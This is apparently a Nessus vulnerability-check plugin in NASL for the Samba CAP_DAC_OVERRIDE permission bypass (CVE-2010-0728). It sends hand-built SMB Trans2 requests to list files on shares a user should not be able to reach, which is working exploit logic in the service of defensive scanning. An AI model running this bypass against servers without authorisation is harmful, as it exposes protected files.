#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(45047);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/05/13 15:33:29 $");

  script_cve_id("CVE-2010-0728");
  script_bugtraq_id(38606);
  script_osvdb_id(62803);

  script_name(english:"Samba 'CAP_DAC_OVERRIDE' File Permission Security Bypass");
  script_summary(english:"Attempts to read secure files from an inaccessible Samba share.");

  script_set_attribute(attribute:"synopsis", value:"The remote file server is vulnerable to a security bypass attack.");
  script_set_attribute(attribute:"description", value:
"The remote Samba server has a flaw that causes all smbd processes,
when libcap support is enabled, to inherit 'CAP_DAC_OVERRIDE'
capabilities, which in turn causes all file system access to be
allowed even when permissions should have been denied.

A remote, authenticated attacker can exploit this flaw to gain access
to sensitive information on Samba shares that are accessible to their
user id.");
  script_set_attribute(attribute:"see_also", value:"http://us1.samba.org/samba/security/CVE-2010-0728.html");
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.samba.org/show_bug.cgi?id=7222");
  script_set_attribute(attribute:"see_also", value:"http://www.samba.org/samba/security/");
  script_set_attribute(attribute:"solution", value:"Upgrade to Samba 3.3.12, 3.4.7, 3.5.1, or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/12");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:samba:samba");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");
  script_dependencies("smb_accessible_shares.nasl");
  script_require_keys("SMB/samba");
  script_require_ports(139, 445);

exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("smb_func.inc");
include("byte_func.inc");

lanman = get_kb_item_or_exit("SMB/NativeLanManager");
if ("Samba " >!< lanman) exit(0, "The SMB service is not running Samba.");

FIND_FIRST2 = 0x0001;
FIND_FILE_BOTH_DIRECTORY_INFO = 0x0401;

#taken from samba_symlink_dir_traversal.nasl
function smb_get_error_code(data)
{
  local_var header, flags2, code;

  #Some checks in the header first
  header = get_smb_header (smbblob:data);
  if (!header)
    return NULL;

  flags2 = get_header_flags2(header:header);
  if (flags2 && SMB_FLAGS2_32BIT_STATUS)
  {
    code = get_header_nt_error_code(header:header);
  }
  else
  {
    code = get_header_dos_error_code(header:header);
  }

  return code;
}

function trans2_get_data_size(data)
{
  return get_word(blob:data, pos:SMB_HDR_SIZE+3);
}

function get_file_names(data, size)
{
  local_var offset, pos, buffer;
  local_var filensize, files, dat, file;
  local_var i;

  files = make_list();
  pos = 0;
  buffer = 2;

  while((pos < size) && (max_index(files) < 5))
  {
    file = '';
    offset = get_dword(blob:data, pos:pos);
    filensize = get_dword(blob:data, pos:pos+60);

    if ((pos == 0) || ((pos+offset) == size))
      dat = substr(data, (offset+pos)-filensize, (offset+pos)-1);
    else
      dat = substr(data, (offset+pos)-filensize-2, (offset+pos)-3);

    for (i=0; i<filensize-1; i+=2)
    {
      file = file + string(dat[i]);
    }
    files[max_index(files)] = file;
    pos = pos+offset;
  }

  return files;
}

#Build the Trans2 request for a directory listing
function list_files()
{
  local_var header, findfirst2_param, params, code;
  local_var smb_params, smb_data, nb_pkt, ret;
  local_var dat, datsize;

  header = smb_header(Command:SMB_COM_TRANSACTION2,
                      Status:nt_status(Status:STATUS_SUCCESS));
  findfirst2_param = raw_word(w:0x0016) + # Search Attributes
                     raw_word(w:1366) + #Search count
                     raw_word(w:0x006) + # Flags
                     raw_word(w:260) + #Level of interest
                     raw_dword(d:0) + #Storage Type
                     unicode(string:"\*"); #Search Pattern

  params = raw_word(w:strlen(findfirst2_param)) + #param len
           raw_word(w:0) +      # data len
           raw_word(w:10) +     # max param count
           raw_word(w:0xffff) + # max data count
           raw_byte(b:0) +      # max setup count
           raw_byte(b:0) +      # reserved
           raw_word(w:0) +      # flags
           raw_dword(d:0) +     # timeout (return immediately)
           raw_word(w:0) +      # reserved
           raw_word(w:strlen(findfirst2_param)) + # param len
           raw_word(w:68) +     # parameter offset
           raw_word(w:0) +      # data len
           raw_word(w:68+strlen(findfirst2_param)) + # data offset
           raw_byte(b:1) + # setup count
           raw_byte(b:0) + # reserved
           raw_word(w:FIND_FIRST2); # subcommand
  smb_params = smb_parameters(data:params);

  smb_data = smb_data(data:mkbyte(0)+mkword(0)+findfirst2_param);
  nb_pkt = netbios_packet(header:header, parameters:smb_params, data:smb_data);
  ret = smb_sendrecv(data:nb_pkt);

  if (!ret)
    return NULL;

  code =  smb_get_error_code(data:ret);
  if (code == int(STATUS_NETWORK_ACCESS_DENIED))
    return make_list(code);
  else if (smb_check_success(data:ret) == FALSE)
    return NULL;

  datsize = trans2_get_data_size(data:ret);

  dat = get_smb_data (smbblob:ret);
  dat = substr(dat, 13, strlen(dat)-1);

  dat = get_file_names(data:dat, size:datsize);

  return dat;
}

#Determine the inaccessible shares
axx_shares = get_kb_item("SMB/accessible_shares/1");
inaxx_shares = make_list();
counter = 0;

list = get_kb_list("SMB/shares");
if (!isnull(list))
{
  list = make_list(list);
  foreach item (list)
  {
    litem = tolower(item);
    if ((item >!< axx_shares) && (litem != "ipc$") && (litem != "print$"))
    {
      inaxx_shares[counter] = item;
      counter++;
    }
  }
}

#Get SMB KB information
name    = kb_smb_name();
port    = kb_smb_transport();
if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");
login   = kb_smb_login();
pass    = kb_smb_password();
domain  = kb_smb_domain();

soc = open_sock_tcp(port);
if (!soc) exit(1, "Failed to open a socket on port "+port+". \n");

vulnshares=0;;
output = NULL;
info = NULL;
connect_share=FALSE;
session_init(socket:soc, hostname:name);

# Attempt to get a directory listing of inaccessible shares.
rc = NetUseAdd(login:login, password:pass, domain:domain);
if (rc != 1)
{
  NetUseDel();
  exit(1, "Can't connect to the Samba server on port "+port+".");
}

foreach share (inaxx_shares)
{
  rc = NetUseAdd(share:share);

  #Attempt to do a directory listing of the share
  if (rc == 1)
  {
    connect_share=TRUE;
    res = list_files();

		if (!empty_or_null(res) && res[0] != int(STATUS_NETWORK_ACCESS_DENIED))
    {
      vulnshares++;
      if (report_verbosity > 1)
      {
        info = info +
          'Share : ' + '\n' + share + '\n';
        if (isnull(res))
        {
          info +=
            '\n' +
            'It was possible to request a directory listing, but there was an \n'+
            'error retrieving the contents.\n'+
            '\n';
        }
        else
        {
          for (i=0; i<max_index(res); i++)
            output = output + res[i] + '\n';
          info +=
            '\n' +
            'The following file were found on share '+share+' (top 5 files) :\n' +
            '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
            output +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n\n';
        }
      }
      else
      {
        info = info + share;
      }
    }
    NetUseDel(close:FALSE);
    if (!thorough_tests) break;
  }
}
NetUseDel();

if (!connect_share) exit(0, "Nessus failed to connect to any inaccessible shares.");

if (vulnshares > 0)
{
  if (report_verbosity > 0)
  {
    if (vulnshares > 1) s='s';
    else s='';
    report =
      '\n' +
      'Nessus was able to enumerate files on the following share'+s+' with an\n'+
      'unprivileged user.\n' +
      '\n'+
      'User  : ' + login+
      '\n';
    report = report + info;
    security_hole(port:port, extra:report);
  }
  else security_hole(port:port);
  exit(0);
}
exit(0, "The Samba server on port "+port+" is not affected.");
